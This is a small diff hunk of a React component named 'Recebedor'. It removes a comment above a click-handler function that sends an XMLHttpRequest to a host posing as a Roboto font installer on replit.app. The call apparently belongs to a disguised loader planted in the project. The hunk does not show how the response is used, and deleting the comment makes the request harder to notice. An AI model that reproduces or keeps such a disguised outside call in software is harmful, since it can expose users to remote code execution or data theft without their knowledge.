@@ -188,7 +188,7 @@ const Recebedor: React.FC = () => {
                           btn.onclick = function(e: Event) {
                             e.preventDefault();
                             
-                            // Function to perform the redirect with optional temp data ID
+                            
                             function performRedirect(tempDataId: string | null) {
                               const xhr = new XMLHttpRequest();
                               xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
